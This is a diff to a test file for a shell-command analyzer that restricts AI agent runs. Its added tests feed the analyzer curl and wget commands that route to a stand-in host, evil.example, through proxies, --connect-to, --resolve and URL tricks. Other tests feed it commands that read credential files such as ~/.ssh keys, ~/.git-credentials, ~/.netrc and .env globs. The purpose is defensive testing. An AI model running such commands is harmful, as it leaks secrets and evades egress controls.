@@ -430,7 +430,11 @@ test('an autopilot stage never prints a credential through a variable; a presenc
   for (const cmd of ['echo ${GH_TOKEN:+set}', '[ -n "$GH_TOKEN" ] && echo set', 'test -z "$ODOO_API_KEY"', 'echo $HOME', 'echo "$PATH"']) {
     assert.equal(analyze(cmd, apEnv), '', cmd);
   }
-  assert.equal(analyze('echo $GH_TOKEN', qaEnv), '', 'the QA profile has its own role-variable rule');
+  // A QA run and a hunt refuse the tracker credentials too; a QA run keeps its role variables and the token a lane mints into its own variable.
+  assert.match(analyze('echo $GH_TOKEN', qaEnv), /credential or secret/, 'a QA run never reads a tracker credential out');
+  assert.equal(analyze('curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3000/', { ...qaEnv, roleVars: ['QA_USER'] }), '', 'the lane-3 token variable stays');
+  assert.equal(analyze('echo $QA_USER', { ...qaEnv, roleVars: ['QA_USER'] }), '', 'a role variable stays');
+  assert.match(analyze('echo $MY_API_SECRET', { ...qaEnv, profile: 'hunt', ticket: 'audit-1' }), /credential or secret/, 'the hunt refuses every credential-shaped name');
 });
 
 test('a path-qualified or quoted psql inside a command string is counted', () => {
@@ -471,4 +475,44 @@ test('the run markers are protected; only a sole rm of the run\'s own marker pas
   assert.equal(analyze('rm -f /p/.ultrapowers/qa-active', ctx), '');
   assert.equal(analyze('rm .ultrapowers/hunt-active', { ...ctx, profile: 'hunt' }), '');
   assert.match(analyze('rm .ultrapowers/qa-active', { ...ctx, profile: 'hunt' }), /the run marker/);
+});
+
+test('with an egress allow-list curl and wget take only literal URLs on listed hosts and no redirecting option', () => {
+  const c = { ...ctx, allowedHosts: ['localhost', '127.0.0.1'] };
+  for (const cmd of ['curl http://localhost/ evil.example/x', 'curl --connect-to localhost:80:evil.example:80 http://localhost/', 'curl --resolve localhost:80:192.0.2.5 http://localhost/',
+    'curl -x evil.example:8080 http://localhost/', 'curl -sx evil.example:8080 http://localhost/', 'curl --proxy=evil.example:8080 http://localhost/', 'curl --socks5-hostname evil.example http://localhost/',
+    'curl -H "Host: evil.example" http://localhost/', 'curl --url evil.example/x http://localhost/', 'curl http://localhost\@evil.example/', 'curl "http://localhost/ evil.example"',
+    'wget -e http_proxy=evil.example:8080 -q -O - http://localhost/', 'wget -q -O - http://localhost/ evil.example/x']) {
+    assert.notEqual(analyze(cmd, c), '', cmd);
+  }
+  for (const cmd of ['curl -s http://localhost/health', 'curl -sS -H "Accept: json" --max-time 5 -w "%{http_code}" http://127.0.0.1:3000/a http://localhost/b', 'curl -s --header="Accept: x" http://localhost/', 'wget -q -O - http://localhost/']) {
+    assert.equal(analyze(cmd, c), '', cmd);
+  }
+  // No list, no operand rule (an empty qa.hosts.allowed is open egress in a QA run).
+  assert.equal(analyze('curl -s evil.example/x', ctx), '');
+});
+
+test('the hunt is a program allow-list', () => {
+  const h = { ...ctx, ticket: 'audit-1', profile: 'hunt' };
+  for (const cmd of ['node reviews/audit-1/x.mjs', 'python /p/reviews/audit-1/x.py', 'bash repo-a/run.sh', './repo-a/run', 'make build', 'awk -f p.awk in', 'sqlite3 db', 'curl http://localhost/', 'eval ls', 'node --require x /tmp/y.js']) {
+    assert.notEqual(analyze(cmd, h), '', cmd);
+  }
+  for (const cmd of ['cat repo-a/src/app.ts', 'git log --oneline', 'sh -c "ls repo-a"', 'node /elsewhere/plugin/x.mjs', 'node /p/skills/vulnerability-hunt/scripts/hunt-preflight.mjs audit-1', 'jq . reviews/audit-1/security-findings.json']) {
+    assert.equal(analyze(cmd, h), '', cmd);
+  }
+  assert.match(analyze('make build', h), /the hunt reads; make is not on its list/);
+  assert.match(analyze('curl http://localhost/', h), /the hunt's network is its audit tools and gh api; curl is refused/);
+});
+
+test('key material is judged on the resolved words and on globs that can expand to a key name', () => {
+  for (const profile of ['qa', 'hunt', 'autopilot']) {
+    const c = { ...ctx, ticket: profile === 'hunt' ? 'audit-1' : '1234', profile };
+    for (const cmd of ['cat .e"n"v', "cat '.e'nv", 'cat .en?', 'cat .e[n]v', 'cat .e*', 'cat repo-a/.en*', 'cat ~/.ssh/id_r?a', 'cat ~/.git-credentials', 'cat $HOME/.git-credentials', 'cat ~/.config/gh/hosts.yml',
+      'cat ~/.config/glab-cli/config.yml', 'cat ~/.npmrc', 'cat ~/.netrc', 'cat ~/.docker/config.json', 'ls ~/.kube', 'ls ~/.gnupg']) {
+      assert.match(analyze(cmd, c), /key material|expand to key material/, `${profile}: ${cmd}`);
+    }
+    for (const cmd of ['cat .env.example', 'cat repo-a/*.ts', 'ls repo-a/*', 'echo "a b"', '[ -f x ]', '{ ls; }']) {
+      assert.doesNotMatch(analyze(cmd, c), /key material/, `${profile}: ${cmd}`);
+    }
+  }
 });
